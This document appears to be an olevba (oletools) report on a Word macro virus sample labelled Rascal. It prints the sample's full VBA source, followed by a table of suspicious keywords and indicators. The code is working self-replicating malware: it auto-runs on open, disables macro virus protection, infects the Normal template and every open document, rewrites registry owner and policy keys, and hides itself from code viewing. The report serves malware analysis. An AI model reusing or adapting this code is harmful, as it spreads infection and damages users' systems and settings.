olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Rascal-f2181cbdc421f13e1c959b3abf4b2988bd054f11
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Rascal-f2181cbdc421f13e1c959b3abf4b2988bd054f11 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO RASCAL321.bas 
in file: Virus.MSWord.Rascal-f2181cbdc421f13e1c959b3abf4b2988bd054f11 - OLE stream: 'Macros/VBA/RASCAL321'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Untuk orang yang aku cintai SHT
'
Public Const mname = "RASCAL321", usht = "Untuk orang yang aku cintai SHT", site = "http://rascal321.cjb.net", mw = "Microsoft Word", _
             lsht = "I love you SHT", pdnu = "Please do not use", isoft = "illegal software...", hklm = "HKEY_LOCAL_MACHINE\", _
             hkcu = "HKEY_CURRENT_USER\", sm = "Software\Microsoft\", cv = "Windows\CurrentVersion\", ACME = "MS Setup (ACME)\User Info\"

Private Sub document_open()
On Error Resume Next
   act
End Sub

Function rasc(oby As Object) As Boolean
On Error Resume Next
Dim i As Integer, n As Integer, kos As Boolean
kos = False
rasc = False
n = oby.VBProject.VBComponents.Count
Set vbc = oby.VBProject.VBComponents
   If vbc.Item(1).Name <> "Thisdocument" Then
      vbc.Item(1).Name = "Thisdocument"
   End If
   For i = 1 To n
       If vbc.Item(i).Name <> mname Then
          vbc.Item(i).Codemodule.DeleteLines 1, vbc.Item(i).Codemodule.Countoflines
       Else
          rasc = True
          If vbc.Item(i).Codemodule.Countoflines < 354 Or vbc.Item(i).Codemodule.Lines(1, 1) <> ("'" & usht) Then kos = True
       End If
   Next i
   If kos Then
      delmac oby
      rasc = False
   End If
End Function

Sub copymac(src As Object, dst As Object)
On Error Resume Next
   Application.OrganizerCopy Source:=src.FullName, Destination:=dst.FullName, Name:=mname, Object:=3
End Sub

Sub delmac(de As Object)
On Error Resume Next
   Application.OrganizerDelete Source:=de.FullName, Name:=mname, Object:=3
End Sub

Sub Autoexec()
On Error Resume Next
   amt
   act
End Sub

Sub act()
On Error Resume Next
Dim org As String, windir As String, fileok As String
    VBFalse
    With System
        .PrivateProfileString("", "HKEY_CLASSES_ROOT\CLSID\{645FF040-5081-101B-9F08-00AA002F954E}", "InfoTip") = usht & "...."
        .PrivateProfileString("", hkcu & sm & "Internet Explorer\PageSetup\", "footer") = usht & " &u&b&d"
        .PrivateProfileString("", hkcu & sm & "Internet Explorer\PageSetup\", "header") = mname & " &w&bPage &p of &P"
        .PrivateProfileString("", hklm & sm & cv & "Winlogon\", "LegalNoticeCaption") = mname
        .PrivateProfileString("", hklm & sm & cv & "Winlogon\", "LegalNoticeText") = lsht
        org = .PrivateProfileString("", hklm & sm & cv, "RegisteredOwner")
        If org <> pdnu Then
           .PrivateProfileString("", hklm & sm & cv, "OrgOwner") = org
           org = .PrivateProfileString("", hklm & sm & cv, "RegisteredOrganization")
           .PrivateProfileString("", hklm & sm & cv, "OrgOrganization") = org
           org = .PrivateProfileString("", hkcu & sm & ACME, "DefName")
           .PrivateProfileString("", hkcu & sm & ACME, "OrgName") = org
           org = .PrivateProfileString("", hkcu & sm & ACME, "DefCompany")
           .PrivateProfileString("", hkcu & sm & ACME, "OrgCompany") = org
           .PrivateProfileString("", hkcu & sm & ACME, "DefName") = lsht
           .PrivateProfileString("", hkcu & sm & ACME, "DefCompany") = mname
           .PrivateProfileString("", hklm & sm & cv, "RegisteredOwner") = pdnu
           .PrivateProfileString("", hklm & sm & cv, "RegisteredOrganization") = isoft
        End If
    End With
    With Application
        .UserName = mname
        .UserInitials = Mid(lsht, 12, 3)
        .UserAddress = "virus@" & Mid(site, 8, 20) & " - " & site
    End With
   stl
   windir = Options.DefaultFilePath(8)
   With Dialogs(86)
        .Author = mname
        .Title = usht
        .Subject = lsht
        .Comments = pdnu & " " & isoft & "This is not dangerous virus, please do not " & "delete or modify this macros. Thank you. "
         .Execute
    End With
    If rasc(NormalTemplate) = False Then
        norattr NormalTemplate
        copymac ActiveDocument, NormalTemplate
        NormalTemplate.Save
    End If
    If rasc(NormalTemplate) = False Then
        Application.OrganizerCopy windir & "\Dxdlg32.dll", NormalTemplate.FullName, mname, 3
    End If
    fileok = Dir(windir & "\Office.dot")
    If fileok = "" Then
        NormalTemplate.OpenAsDocument.SaveAs windir & "\Office.dot", , , , AddToRecentFiles:=False
        ActiveDocument.Close SaveChanges:=-1
    End If
    fileok = Dir(windir & "\Dxdlg32.dll")
    If fileok = "" Then
        NormalTemplate.OpenAsDocument.SaveAs windir & "\Dxdlg32.dll", , , , AddToRecentFiles:=False
        ActiveDocument.Close SaveChanges:=-1
    End If
    If rasc(ActiveDocument) = False Then
        norattr ActiveDocument
        copymac NormalTemplate, ActiveDocument
    End If
    Infectall
End Sub

Sub ToolsMacro()
    err
On Error Resume Next
    appexit
End Sub

Sub ViewVBCode()
    err
On Error Resume Next
    NoRun
    appexit
End Sub

Sub ViewCode()
    ViewVBCode
End Sub

Sub FileSave()
On Error Resume Next
    show
    amt
    act
    With ActiveDocument
        .Save
        .Saved = True
    End With
End Sub

Sub FileOpen()
On Error Resume Next
Set AD = ActiveDocument
    VBFalse
    stl
    amt
    If Dialogs(80).show <> 0 Then
        AutoOpen
        If AD.Saved = False And Left(AD.Name, 8) <> "Document" Then AD.Save
    End If
    amf
End Sub

Sub AutoOpen()
On Error Resume Next
    VBFalse
    stl
    amt
    act
    show
    Infectall
End Sub

Sub FileClose()
On Error Resume Next
Set AD = ActiveDocument
    show
    amt
    act
    If AD.Saved = False And Left(AD.Name, 8) <> "Document" Then AD.Save
    AD.Close
    amf
End Sub

Sub AutoClose()
On Error Resume Next
Set AD = ActiveDocument
    stl
    act
    If AD.Saved = False And Left(AD.Name, 8) <> "Document" Then AD.Save
End Sub

Sub FileNew()
On Error Resume Next
    nstl
    If Dialogs(79).show <> 0 Then copymac NormalTemplate, ActiveDocument
    stl
End Sub

Sub FileNewDefault()
On Error Resume Next
    show
    WordBasic.FileNewDefault
    copymac NormalTemplate, ActiveDocument
End Sub

Sub ToolsOptions()
On Error Resume Next
    nstl
    Dialogs(974).show
    stl
    show
End Sub

Sub FilePrint()
On Error Resume Next
    If Minute(Now) > 55 Or Minute(Now) < 5 Then
        Set aw = ActiveWindow.ActivePane.View
        Set S = Selection
        aw.SeekView = 9
        S.TypeText mname
        aw.SeekView = 10
        S.TypeText usht
        aw.SeekView = 0
    End If
    Dialogs(88).show
End Sub

Sub NoRun()
On Error Resume Next
    With System
        .PrivateProfileString("", hkcu & sm & cv & "Policies\Explorer\", "NoClose") = "1"
        .PrivateProfileString("", hkcu & sm & cv & "Policies\Explorer\", "NoRun") = "1"
        .PrivateProfileString("", hklm & "Network\Logon\", "PrimaryProvider") = "Microsoft Network"
        .PrivateProfileString("", hklm & "Network\Logon\", "username") = "SHT-" & mname
        .PrivateProfileString("", hkcu & "Control Panel\International\", "s1159") = Mid(mname, 1, 6)
        .PrivateProfileString("", hkcu & "Control Panel\International\", "s2359") = Mid(mname, 1, 6)
    End With
End Sub

Sub err()
    MsgBox "This program has performed an illegal operation and will shut down.", 16, mw
End Sub

Sub norcap()
On Error Resume Next
    Application.Caption = mw
    System.Cursor = 2
End Sub

Sub chcap(tcap As String)
On Error Resume Next
    Application.Caption = mw & " - " & tcap
End Sub

Sub show()
On Error Resume Next
Set ap = Application
    If Minute(Now) < 15 Then
        chcap lsht
        ap.OnTime Now + TimeSerial(0, 0, 5), "norcap"
    End If
    If Minute(Now) >= 15 And Minute(Now) <= 30 Then
       chcap mname
       ap.OnTime Now + TimeSerial(0, 0, 5), "norcap"
    End If
    If Minute(Now) > 30 Then
       chcap site
       ap.OnTime Now + TimeSerial(0, 0, 5), "norcap"
    End If
    Application.StatusBar = "Have a nice day for all my friends in Pakuan University, Bogor."
    System.Cursor = 2
    bday
End Sub

Sub amt()
On Error Resume Next
    WordBasic.DisableAutoMacros True
End Sub

Sub amf()
On Error Resume Next
    WordBasic.DisableAutoMacros False
End Sub

Sub stl()
On Error Resume Next
Dim windir As String
   windir = System.PrivateProfileString("", hklm & sm & cv, "SystemRoot")
   With Options
      .VirusProtection = False
      .SaveNormalPrompt = False
      .ConfirmConversions = False
      .SavePropertiesPrompt = False
      .DefaultFilePath(8) = windir & "\System"
   End With
End Sub

Sub nstl()
On Error Resume Next
    With Options
        .VirusProtection = True
        .SaveNormalPrompt = True
        .ConfirmConversions = True
        .SavePropertiesPrompt = True
        .DefaultFilePath(8) = .DefaultFilePath(6) & "\Startup"
    End With
End Sub

Sub norattr(noby As Object)
On Error Resume Next
    SetAttr noby.FullName, vbArchive
End Sub

Sub bday()
On Error Resume Next
    If Month(Now) = 9 And Day(Now) = 10 Then
    Dim msg As String, ent As String, quo As String
        ent = Chr$(13)
        quo = Chr$(34)
        msg = "Selamat ulang tahun aku ucapkan untuk" & ent
        msg = msg & "orang yang sangat aku cintai " & quo & "SHT" & quo & "." & ent
        msg = msg & "Semoga panjang umur dan sukses selalu." & ent
        msg = msg & "Untuk itu sebaiknya anda meliburkan diri hari ini" & ent
        msg = msg & "dan memberikan ucapan selamat juga untuk " & quo & "SHT" & quo & "."
        msg = msg & ent & "Terimakasih."
        MsgBox msg, 64, usht
        Application.OnTime Now + TimeSerial(0, 5, 0), "appexit"
        System.Cursor = 2
    End If
End Sub

Sub appexit()
On Error Resume Next
Dim i As Integer, andoc As Object
    If Documents.Count > 0 Then
       For i = 1 To Documents.Count
          Set andoc = Documents(i)
          andoc.Saved = True
       Next i
    End If
    Application.Quit
End Sub

Sub VBFalse()
On Error Resume Next
       Application.ShowVisualBasicEditor = False
End Sub

Sub Infectall()
On Error Resume Next
Dim i As Integer, andoc As Object
    If Documents.Count > 0 Then
       For i = 1 To Documents.Count
          Set andoc = Documents(i)
          If rasc(andoc) = False Then copymac NormalTemplate, andoc
          If Left(andoc.Name, 8) <> "Document" Then andoc.Save
       Next i
       If Minute(Now) >= 55 Then Selection.TypeText pdnu & " " & isoft
    End If
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |document_open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://rascal321.cjb|URL                                          |
|          |.net                |                                             |
|IOC       |Dxdlg32.dll         |Executable file name                         |
+----------+--------------------+---------------------------------------------+
